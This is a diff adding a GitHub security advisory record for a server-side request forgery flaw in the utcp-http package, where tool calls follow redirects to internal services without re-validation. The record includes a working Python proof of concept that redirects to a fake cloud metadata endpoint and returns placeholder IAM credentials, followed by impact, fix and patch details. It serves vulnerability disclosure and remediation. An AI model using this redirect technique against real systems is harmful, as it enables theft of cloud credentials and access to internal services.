@@ -1,0 +1,59 @@
+{
+  "id": "GHSA-9qhg-99ww-9mqc",
+  "modified": "2026-08-25T23:58:07.304702919Z",
+  "published": "2026-08-25T15:48:51Z",
+  "summary": "utcp-http SSRF: HTTP tool invocation follows redirects without re-validating the target",
+  "details": "## Summary\n\n`HttpCommunicationProtocol.call_tool` validates only the pre-redirect tool URL, then issues the request with redirects enabled and never re-checks where it lands. A tool whose endpoint is an attacker-controlled public URL can therefore `302`-redirect the UTCP client into an internal service including the cloud metadata endpoint and the response body is returned to the tool caller. This is a working SSRF + internal-data-exfiltration primitive.\n\nThis is the redirect invariant of the SSRF class fixed in GHSA-39j6-4867-gg4w; that fix added an invocation-time URL check but left the redirect hop unguarded. This vector bypasses the GHSA-39j6-4867-gg4w mitigation via unvalidated redirects.\n\n## Root cause\n\n1. The resolved URL is validated once, before the request:\n\nhttps://github.com/universal-tool-calling-protocol/python-utcp/blob/4ed0a48b84a452338bd3e996efb0d169e8d75ac2/plugins/communication_protocols/http/src/utcp_http/http_communication_protocol.py#L281\n\n2. The request is then made with aiohttp's default `allow_redirects=True` and no\n   per-hop revalidation, so the redirect target bypasses the check entirely:\n\nhttps://github.com/universal-tool-calling-protocol/python-utcp/blob/4ed0a48b84a452338bd3e996efb0d169e8d75ac2/plugins/communication_protocols/http/src/utcp_http/http_communication_protocol.py#L313-L332\n\nThe validator (`_security.py`) blocks plain-HTTP to non-loopback hosts, exactly the metadata/internal case, but only the first hop ever reaches it.\n\n## Reachability\n\nTriggered whenever the host registers a tool/manual whose endpoint URL is attacker-influenced (e.g. a manual or OpenAPI spec discovered from a runtime-supplied URL: a core UTCP usage pattern) and that tool is then called. The initial URL only has to pass the validator (any `https://`, or a benign host the attacker controls); the attacker's server supplies the redirect. No special configuration is required.\n\n## Preconditions\n\n- The attacker controls the server the tool points at - either the registered tool/manual endpoint URL is attacker-influenced (e.g. a manual/OpenAPI spec discovered from a runtime-supplied URL), or a legitimate endpoint the tool already points at is attacker-controlled or compromised.\n- The initial tool URL passes `ensure_secure_url` â€” trivially met by any `https://` URL or a benign attacker-owned host; the attacker only needs to return a `3xx` `Location`.\n- The tool is invoked (`call_tool`) after registration.\n- An internal HTTP service is reachable from the UTCP process and returns useful data on an unauthenticated `GET` (cloud metadata, internal admin panel, unauth datastore, link-local endpoint).\n- The tool's return value is surfaced back to the caller/agent (the usual agentic flow), giving the attacker the response body.\n- For the IAM-credential outcome specifically: the host runs on a cloud instance with **IMDSv1** enabled. IMDSv2-only hosts block this exact result (it needs a `PUT` for a session token), but other internal-SSRF targets remain reachable.\n\n## PoC\n\nThe validator rejects the internal targets directly, but the redirect from an allowed tool URL reaches one anyway and returns its body. Runs the real released `HttpCommunicationProtocol`; the \"metadata\" service is bound on a non-loopback LAN IP, which the validator rejects exactly like `169.254.169.254`.\n\nRun: `pip install utcp-http==1.1.3 aiohttp \u0026\u0026 python poc.py`\n\n```python\nimport asyncio, socket\nfrom aiohttp import web\nfrom utcp_http.http_communication_protocol import HttpCommunicationProtocol\nfrom utcp_http.http_call_template import HttpCallTemplate\n\nMD = \"/latest/meta-data/iam/security-credentials/app-role\"\nSTOLEN = {\"Code\": \"Success\", \"AccessKeyId\": \"ASIAEXAMPLESTOLENKEY\",\n          \"SecretAccessKey\": \"wJalr/EXAMPLE/STOLEN/SECRET\", \"Token\": \"Fwo...session\"}\n\ndef lan_ip():\n    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    try: s.connect((\"8.8.8.8\", 80)); return s.getsockname()[0]\n    finally: s.close()\n\nasync def main():\n    internal = lan_ip()\n    meta = web.Application(); meta.router.add_get(MD, lambda r: web.json_response(STOLEN))\n    mr = web.AppRunner(meta, access_log=None); await mr.setup()\n    ms = web.TCPSite(mr, \"0.0.0.0\", 0); await ms.start()\n    internal_url = f\"http://{internal}:{ms._server.sockets[0].getsockname()[1]}{MD}\"\n\n    atk = web.Application()\n    atk.router.add_get(\"/tool\", lambda r: web.Response(status=302, headers={\"Location\": internal_url}))\n    ar = web.AppRunner(atk, access_log=None); await ar.setup()\n    as_ = web.TCPSite(ar, \"127.0.0.1\", 0); await as_.start()\n    tool_url = f\"http://127.0.0.1:{as_._server.sockets[0].getsockname()[1]}/tool\"\n\n    proto = HttpCommunicationProtocol()\n    ct = HttpCallTemplate(name=\"lookup\", url=tool_url, http_method=\"GET\")  # passes the validator\n    result = await proto.call_tool(None, \"lookup\", {}, ct)                 # follows 302 -\u003e internal\n    print(\"caller received:\", result)\n    await ar.cleanup(); await mr.cleanup()\n\nasyncio.run(main())\n```\n\nOutput:\n\n```\ncaller received: {'Code': 'Success', 'AccessKeyId': 'ASIAEXAMPLESTOLENKEY', 'SecretAccessKey': 'wJalr/EXAMPLE/STOLEN/SECRET', 'Token': 'Fwo...session'}\n```\n\n## Impact\n\nBlind-to-readable SSRF from the UTCP host's network position, with the internal response handed back to the caller. On a cloud instance with IMDSv1 this yields the instance role's IAM credentials (as shown), i.e. infrastructure takeover; more generally it reaches internal HTTP services (admin panels, unauth datastores, link-local endpoints) that the validator is specifically meant to block.\n\n## Possible fix\n\nDisable automatic redirects for tool invocation (`allow_redirects=False`) and, if redirects must be supported, re-run `ensure_secure_url` on every hop's `Location` before following it. Resolving the host and rejecting private/link-local/loopback IPs (not just plain-HTTP non-loopback) closes the residual `https://`-to-internal case as well.\n\n## Patched\n\nFixed in `utcp-http` 1.1.4. `_security.py` now ships\n`safe_request_with_redirects`, a per-hop revalidator that disables\naiohttp's auto-follow, runs `ensure_secure_url` on every `Location`\nheader before issuing the next hop, caps the chain at 5 hops, and drops\nthe body on 303 per RFC 7231. The HTTP, SSE, and streamable-HTTP\nplugins use it for both `register_manual` and `call_tool`; SSE +\nstreamable handshakes additionally reject any 3xx outright because the\nstreaming response has to stay open for the lifetime of the call. The\nOAuth2 token-fetch path uses the same helper, closing the\nredirect-on-token-URL variant.\n\nThe sister TypeScript implementation `@utcp/http` is fixed the same way\nin 1.1.4.\n\nUpgrade to `utcp-http \u003e= 1.1.4`. No workaround in earlier versions\nshort of disabling all attacker-influenced manuals.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "utcp-http",
+        "purl": "pkg:pypi/utcp-http"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.1.4"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "1.0.0",
+        "1.0.1",
+        "1.0.2",
+        "1.0.3",
+        "1.0.4",
+        "1.0.5",
+        "1.1.0",
+        "1.1.1",
+        "1.1.2",
+        "1.1.3"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.1.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-9qhg-99ww-9mqc/GHSA-9qhg-99ww-9mqc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/universal-tool-calling-protocol/python-utcp/security/advisories/GHSA-9qhg-99ww-9mqc"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/universal-tool-calling-protocol/python-utcp/commit/fc3268e2a62e1181f91a63faf0a9bcee7639db29"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/universal-tool-calling-protocol/python-utcp"
+    }
+  ]
+}
